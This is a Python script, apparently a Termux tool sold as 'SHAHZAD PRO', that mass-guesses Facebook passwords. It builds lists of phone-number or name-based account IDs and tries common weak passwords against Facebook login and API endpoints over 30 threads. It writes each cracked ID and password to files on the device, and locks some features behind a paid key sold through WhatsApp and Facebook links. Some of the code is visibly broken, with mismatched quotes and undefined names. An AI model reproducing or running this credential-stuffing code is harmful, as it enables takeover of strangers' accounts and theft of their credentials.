#SUNA TO HO GA JB HAJI ATA HA TO SHETAN BHAG JATY
#JB BURA TIME A SKTA TO ACHA B A JY GA
from os import path
import os,base64,zlib,pip,urllib
os.system('xdg-open https://facebook.com/groups/291183553213655/')
print('\n\033[1;97m [•] checking update 10.8 \n [•] wait a few sec... \n [•] Join LUQMAN facebook Group')
...
Pro
  \33[;97m
=======================================================
\033[;37m\033[;97m         Facebook       \033[;37m\033[;92m  : RAHA SHAHZAD
\033[;37m\033[;97m         Version          \033[;37m\033[;92m: 1.  1
\033[;37m=======================================================
...
def approval():
  ...
  id = "-".join(uuid)
  try:
    httpCaht = requests.get('https://raw.githubusercontent.com/Rajashahzad/Approved/main/Approved.txt').text
    if id in httpCaht:
      ...
      print("\33[1;97m----------------------------------------------")
      print("\33[1;97mFirst Join RAHA SHAHZAD Group ")
      print('Copy Key and send RAHA SHAHZAD Owner')
      print('Command paid its not free')
      print('\33[1;97m----------------------------------------------')
      print ('IF U DONT WANT TO BUY PLS DONT PRESS ENTER')
      input('IF U WANT TO BUY THEN PRESS ENTER ')
      os.system('xdg-open https://www.facebook.com/Haji.ahmed.1122)! 
      time.sleep(1)
      exit()
...
def menu():
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        print("\033[1;31m Your Not Premium User...!\033[1;97m");time.sleep(1)
                        clear()
                        ...
                        linex()
                        url_wa = "https://api.whatsapp.com/send?phone=+923185593303&text="
                        name = input(" Enter your Name : ")
                        linex()
                        tks = ("Hi RAHA SHAHZAD Sir, I Need To Buy Your Paid SHAHZAD PRO Tools Version 1.9.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
                        subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
                        print(' Run :  python SHAHZAD.py')
                        exit()
        except ValueError:
                exit()
        except requests.exceptions.ConnectionError:
...
def pak():
                ...
                for nmbr in range(limit):
                        ...
                        user.append(nmp)
                with tred(max_workers=30) as LUQMAN:     
                        clear()
                        tl = str(len(user))
                        print('Total account : \033[1;32m'+tl)
                        print(f'\033[1;97mUse flight mode for speed up\033[1;97m')
                        linex()
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'khankhan','khan1122','khan12345','khan1234','khan12','khan786','khan123','khan123456','khankhan123','786786']
                                LUQMAN.submit(rndm,ids,passlist)
                print('\033[1;97m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
...
def bd():
                ...
                linex()
                input(' Press enter to back ')
                os.system('python SHAHZAD.py')
def gmail():
                os.system('rm -rf .re.txt')
                clear()
                print('\033[1;97m example: muhammad, ali, sajjad, faizan\033[1;97m')
                linex()
                first = input(' Put first name: ')
                linex()
                print('\033[1;97m example: khan, ahmad, ali \033[1;97m')
                linex()
                ...
                with tred(max_workers=30) as LUQMAN:
                        ...
                        for user in fo:
                                ...
                                SHAHZAD.submit(rndm,ids,passlist)
                print('\033[1;97m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
...
def ffb(ids,names,passlist):
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        ua = "[FBAN/FB4A;FBAV/251.0.0.31.111;FBBV/188827985;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/192128667;FBCR/Sprint;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SPH-L720T;FBSV/4.4.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]"                           
                        ...
                        SHAHZAD=session.cookies.get_dict().keys()
                        if "c_user" in SHAHZAD:
                                coki=session.cookies.get_dict()
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print('\r\r\033[1;32m SHAHZAD-OK %s | %s'%(ids,pas))
                                open('/sdcard/SHAHZAD-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in SHAHZAD:
                                if 'y' in pcp:
                                        print('\r\033[1;97m SHAHZAD-CP '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/SHAHZAD-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m SHAHZAD-OK '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/SHAHZAD-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
...
def api1(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32mLUQMAN-OK '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/LUQMAN-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                ...
                try:
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/SHAHZAD-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m SHAHZAD-OK '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/SHAHZAD-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32mSHAHZAD-OK '+uid+' | '+pas+'\033[1;97m')
                                                open('/sdcard/SHAHZAD-OK.txt','a').write(uid+'|'+pas+'\n')
                                                oks.append(ids)
                                                break
                                else:
